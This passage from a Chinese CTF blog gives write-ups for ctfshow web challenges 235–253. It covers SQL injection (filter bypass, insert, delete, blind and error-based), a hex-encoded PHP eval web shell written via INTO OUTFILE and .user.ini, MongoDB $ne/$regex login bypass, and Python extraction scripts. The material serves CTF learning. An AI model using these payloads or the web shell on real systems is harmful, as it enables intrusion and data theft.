<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>过滤<code>or '</code><br>这题。。上面的information带or，参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106647880">bypass information</a><br>表名：<code>password=\&amp;username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#</code> 只有这个成了，其他的没成功<br>列名不得行，其他库中并未存储列名，还有办法：无列名注入，上面的博客也有写，payload：<code>password=\&amp;username=,username=(select `2` from (select 1,2,3 union select * from flag23a1 limit 1,1)y)#</code>，其实<a href="https://yq1ng.github.io/z_post/GYCTF2020%E9%83%A8%E5%88%86WEB/#gyctf2020ezsqli">GYCTF2020 Ezsqli</a>就已经写过了</p>
<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><p>增加过滤<code>flag</code>，棒棒哒<br>表名和上题一样，测试了<code>password=flag&amp;username=banlist,ctfshow_user,flaga</code>可以把密码改为flag，也就是输出过滤。。。我以为是输入过滤<br>输出编码，前几关就是这么过的payload：<code>password=\&amp;username=,username=(select hex(`2`) from (select 1,2,3 union select * from flaga limit 1,1)y)#</code></p>
<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>sql: <code>$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";</code>，无过滤<br>注意：insert盲注会产生大量数据<br>api下插入不得行，抓包发现是在<code>URL/api/insert.php</code>下<br>表名：<code>username=yq1ng',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&amp;password=yq1ng</code><br>列名：<code>username=yq1ng',(select group_concat(column_name) from information_schema.columns where table_name='flag'))#&amp;password=yq1ng</code><br>flag: <code>username=yq1ng',(select group_concat(flagass23s3) from flag))#&amp;password=yq1ng</code></p>
<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>过滤空格<br>那就不用呗，前面的老套路，括号淦，表名：<code>username=yq1ng',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&amp;password=yq1ng</code><br>列名：<code>username=yq1ng',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))#&amp;password=yq1ng</code><br>flag: <code>username=yq1ng',(select(group_concat(flag))from(flagb)))#&amp;password=yq1ng</code></p>
<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>增加过滤<code>or</code><br>这是又过了一遍？前面的无列名注入？什么你忘了？回去看看web235！<br>表名：<code>username=yq1ng',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&amp;password=yq1ng</code><br>列名：占坑，试了没弄出来<br>flag: <code>username=yq1ng',(select(group_concat(flag))from(flagbb)))#&amp;password=yq1ng</code>，猜的。。。</p>
<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>sql：<code>$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";</code><br>waf: <code>空格 or sys mysql</code><br>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写<br>就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去<code>URL/page.php</code>最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110144623">Y4师傅</a>，先附上师傅脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""
Author:Y4tacker
"""</span>
<span class="token keyword">import</span> random
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://35963b4d-3501-4bf2-b888-668ad24e1bc5.chall.ctf.show"</span>
url_insert <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/api/insert.php"</span>
url_flag <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/api/?page=1&amp;limit=1000"</span>


<span class="token comment"># 看命函数</span>
<span class="token keyword">def</span> <span class="token function">generate_random_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sttr <span class="token operator">=</span> <span class="token string">'ab'</span>
    str_list <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>sttr<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    random_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>str_list<span class="token punctuation">)</span>
    <span class="token keyword">return</span> random_str


<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1',(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">{</span>generate_random_str<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">)))#"</span></span><span class="token punctuation">,</span>
        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">""</span>
    <span class="token punctuation">}</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url_insert<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_flag<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> r2<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> r2<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span>  <span class="token string">"flag"</span> <span class="token keyword">in</span> i<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">break</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-29 23:00</span>
<span class="token comment"># @challenges： web240</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> random

url <span class="token operator">=</span> <span class="token string">"http://d140c93f-746e-41d4-a13e-02c42e17237d.chall.ctf.show/api/insert.php"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">}</span>

<span class="token keyword">def</span> <span class="token function">TableName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    values <span class="token operator">=</span> <span class="token string">"ab"</span>
    table <span class="token operator">=</span> <span class="token punctuation">[</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>values<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    tableName <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>table<span class="token punctuation">)</span>
    <span class="token keyword">return</span> tableName

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"yq1ng',(select(flag)from(flag</span><span class="token interpolation"><span class="token punctuation">{</span>TableName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">)))#"</span></span>
    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>或者你不看命，最多32次必出！自行加载</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">tbName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>"<span class="token punctuation">.</span><span class="token operator">/</span>tbname<span class="token punctuation">.</span>txt<span class="token string">','</span>w<span class="token operator">+</span>'<span class="token punctuation">)</span>
    <span class="token keyword">for</span> a1 <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
        <span class="token keyword">for</span> a2 <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
            <span class="token keyword">for</span> a3 <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
                <span class="token keyword">for</span> a4 <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
                    <span class="token keyword">for</span> a5 <span class="token keyword">in</span> list1<span class="token punctuation">:</span>
                        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>a1<span class="token operator">+</span>a2<span class="token operator">+</span>a3<span class="token operator">+</span>a4<span class="token operator">+</span>a5<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>
tbName<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><p>无过滤的delete注入，基于时间盲注，表的内容不要太多，因为返回时间是<code>sleep(x)*条数</code>（flag不对建议再跑一次，或者不急的话可以增加时间，因为服务器响应可能有时候比较慢）</p>
<p>payload：<code>URL/api/delete.php</code> 爆表：<code>-1 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(1),0)</code>，其他的就是正常注入，改一下if条件就好</p>
<p>注意，if最后条件为0，不然直接把表清空了hhh</p>
<h2 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h2><p>sql：<code>$sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";</code></p>
<p>无过滤</p>
<p>介绍一下<code>into outfile</code></p>
<blockquote>
<ol>
<li>介绍：<br>SELECT INTO…OUTFILE语句把表数据导出到一个文本文件中，并用LOAD DATA …INFILE语句恢复数据。但是这种方法只能导出或导入数据的内容，不包括表的结构，如果表的结构文件损坏，则必须先恢复原来的表的结构。也可以将查询结果保存在变量中。<ol start="2">
<li>语法：<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token constant">INTO</span> <span class="token constant">OUTFILE</span> <span class="token single-quoted-string string">'file_name'</span>
        <span class="token punctuation">[</span><span class="token constant">CHARACTER</span> <span class="token constant">SET</span> charset_name<span class="token punctuation">]</span>
        <span class="token punctuation">[</span>export_options<span class="token punctuation">]</span>

export_options<span class="token punctuation">:</span>
    <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token constant">FIELDS</span> <span class="token operator">|</span> <span class="token constant">COLUMNS</span><span class="token punctuation">}</span>
        <span class="token punctuation">[</span><span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token single-quoted-string string">'string'</span><span class="token punctuation">]</span><span class="token comment">//分隔符</span>
        <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token constant">OPTIONALLY</span><span class="token punctuation">]</span> <span class="token constant">ENCLOSED</span> <span class="token constant">BY</span> <span class="token single-quoted-string string">'char'</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span><span class="token constant">ESCAPED</span> <span class="token constant">BY</span> <span class="token single-quoted-string string">'char'</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span>
    <span class="token punctuation">[</span><span class="token constant">LINES</span>
        <span class="token punctuation">[</span><span class="token constant">STARTING</span> <span class="token constant">BY</span> <span class="token single-quoted-string string">'string'</span><span class="token punctuation">]</span>
        <span class="token punctuation">[</span><span class="token constant">TERMINATED</span> <span class="token constant">BY</span> <span class="token single-quoted-string string">'string'</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
</li>
</ol>
</blockquote>
<pre><code>“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</code></pre>
<p><code>FIELDS</code>和<code>LINES</code>两个子句都是自选的，但是如果两个子句都被指定了，FIELDS必须位于LINES的前面。</p>
<p>所以，利用分隔符进行写shell</p>
<p>payload：<code>URL/api/dump.php</code><br><code>filename=yq1ng.php' lines terminated by 0x273C3F70687020406576616C28245F504F53545B277971316E67275D293B3F3E27'</code> –&gt; <code>'&lt;?php @eval($_POST['yq1ng']);?&gt;'</code></p>
<h2 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h2><p>太菜了，一直没传对，问了问群主，这题上传<code>.user.ini</code>解析图片就行，上传URL：<code>URL/api/dump.php</code>，进制内容自行转换查看</p>
<p><code>.user.ini</code>的payload：<code>filename=.user.ini' lines starting by ';' terminated by 0x0A6175746F5F70726570656E645F66696C653D7971316E672E6A70670A6175746F5F617070656E645F66696C653D7971316E672E6A70670A;--+</code></p>
<p><code>yq1ng.jpg</code>的payload：<code>filename=yq1ng.jpg' lines terminated by 0x273C3F70687020406576616C28245F504F53545B277971316E67275D293B3F3E27;--+</code></p>
<p>最后在<code>URL/dump/index.php</code>下蚁剑链接即可</p>
<h2 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h2><p>报错注入，无过滤<br>sql：<code>$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";</code></p>
<p>payload：<code>URL/api/?id=1' and (updatexml(1,concat(0x7e,(select right(flag,30) from ctfshow_flag),0x7e),1));%23</code><br>注意：报错最大长度为32位，需要配合截取函数使用</p>
<p>原理：</p>
<blockquote>
<p><code>updatexml (XML_document, XPath_string, new_value); </code> –&gt; 改变文档中符合条件的节点的值<br>参数介绍：</p>
<ul>
<li>第一个参数：<code>XML_document</code>是String格式，为XML文档对象的名称，文中为Doc</li>
<li>第二个参数：<code>XPath_string</code> (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。</li>
<li>第三个参数：<code>new_value</code>，String格式，替换查找到的符合条件的数据</li>
</ul>
</blockquote>
<blockquote>
<p>报错原理：<br>第二个参数<code>XPath_string</code>，如果传入的的不是XPath格式就会报错<br>为什么要使用concat 这个函数呢，因为它是个连接函数你不用的话(updatexml(1,(select user()),1)) 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到concat用特殊字符给他连接起来</p>
</blockquote>
<h2 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h2><p>sql: <code>$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";</code><br>过滤<code>updatexml</code>，报错姿势很多的<br>payload：<code>URL/api/?id=1' and (extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)))%23</code></p>
<p>原理：</p>
<blockquote>
<p><code>extractValue(xml_frag, xpath_expr)</code> –&gt; 使用XPath表示法从XML字符串中提取值<br>参数介绍：</p>
<ul>
<li>第一个参数可以传入目标xml文档</li>
<li>第二个参数是用Xpath路径法表示的查找路径</li>
</ul>
</blockquote>
<p>原理同上</p>
<h2 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h2><p>sql：<code>$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";</code></p>
<p>过滤：<code>updatexml</code> <code>extractvalue</code></p>
<p>floor报错，原理在另外一篇博客，<a href="https://yq1ng.github.io/z_post/%E9%87%8D%E5%90%AF%EF%BC%8CSQLi-labs-GET/#less-6-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">点此进入</a>，注意，子查询返回只能为1行</p>
<p>爆表：<code>URL/api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23</code></p>
<p>flag列：<code>api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name="ctfshow_flags" limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23</code></p>
<p>因为ctfshow_flags表只有一行，就不limit了：<code>URL/api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23</code></p>
<h2 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h2><p>猜着就会过滤floor哈哈哈<br>sql: <code>$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";</code></p>
<p>过滤：<code>updatexml</code> <code>extractvalue</code> <code>floor</code></p>
<p>。。。12种报错全试了，一会再来<br>只得试出数据库版本<code>URL/api/?id=1' and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);%23</code><br>盲！盲注yyds，前面的脚本随便改个，可以说是无过滤(脚本没跑成，用了sqlmap，脚本未成的原因是列名字典我没加<code>?</code>。。。)，当然，sqlmap也行，记得加上请求头<code>--user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"</code></p>
<h2 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h2><p>udf注入，这个真是第一次听说，Google一番也是不会，只知道是利用MySQL提权的，用的翅膀大佬的脚本，只能说tttttqqqqql，翅膀师傅的脚本注释也写得很明白，永存了，膜</p>
<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>sql：emm忘了写，下次一定<br>无waf<br><a target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/mongodb-tutorial.html">MongoDB 教程</a><br><a target="_blank" rel="noopener" href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p>
<blockquote>
<p>常见的条件操作符：</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">$gt : &gt;
$lt : &lt;
$gte: &gt;=
$lte: &lt;=
$ne : !=、&lt;&gt;
$in : in
$nin: not in
$all: all
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload：<code>?id[]=flag</code></p>
<p>这个应该算是php对阶mongoDB的一个漏洞吧</p>
<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//sql</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//返回逻辑</span>
<span class="token comment">//无过滤</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token single-quoted-string string">'登陆成功'</span><span class="token punctuation">;</span>
<span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload：<code>username[$ne]=1&amp;password[$ne]=1</code>，没啥说的，和上题一样，姿势多，也能正则</p>
<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>sql与过滤没区别<br>payload：<code>username[$ne]=yq1ng&amp;password[$ne]=yq1ng</code>，出了admin，只需改用户名:<code>username[$ne]=admin&amp;password[$ne]=yq1ng</code></p>
<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><p>sql: <code>db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()</code></p>
<p>先<code>username[$ne]=yq1ng&amp;password[$ne]=yq1ng</code>就是找出数据库不是<code>yq1ng</code>的数据，出了个<code>admin</code>，再用251就不行了，需要接着把pass也改了<code>username[$ne]=admin&amp;password[$ne]=ctfshow666nnneeaaabbbcc</code>，getflag</p>
<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>sql：<code>db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()</code><br>返回一样，无过滤</p>
<p>脚本去跑，手工不会。。。盲注yyds，经过前面猜测用户名为<code>flag</code>，不知道也能猜，附上脚本，虽然不是二分，但是也挺快，利用了正则匹配，<code>^yq1ng</code>匹配以<code>yq1ng</code>开头的字符串，不懂的建议<a target="_blank" rel="noopener" href="https://www.runoob.com/regexp/regexp-syntax.html">移步于此</a>，了解re基本语法</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding:     utf-8</span>
<span class="token comment"># @Author:      yq1ng</span>
<span class="token comment"># @Date:        2020-11-29 15:20</span>
<span class="token comment"># @challenges： web253</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://c7bb9fe9-ef52-4eea-a08c-72937d2c25cb.chall.ctf.show/api/"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"username[$regex]"</span><span class="token punctuation">:</span><span class="token string">"flag"</span><span class="token punctuation">,</span><span class="token string">"password[$regex]"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span><span class="token punctuation">:</span>
            data<span class="token punctuation">[</span><span class="token string">"password[$regex]"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"^"</span><span class="token operator">+</span>flag<span class="token operator">+</span>y
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            s <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"6210"</span> <span class="token keyword">in</span> s<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> y
                <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
                <span class="token keyword">break</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">yq1ng</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="http://yq1ng.github.io/2020/11/01/ctfshow-web-ru-men-ttick-zong-jie/">http://yq1ng.github.io/2020/11/01/ctfshow-web-ru-men-ttick-zong-jie/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">yq1ng</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/">
                                    <span class="chip bg-color">...</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
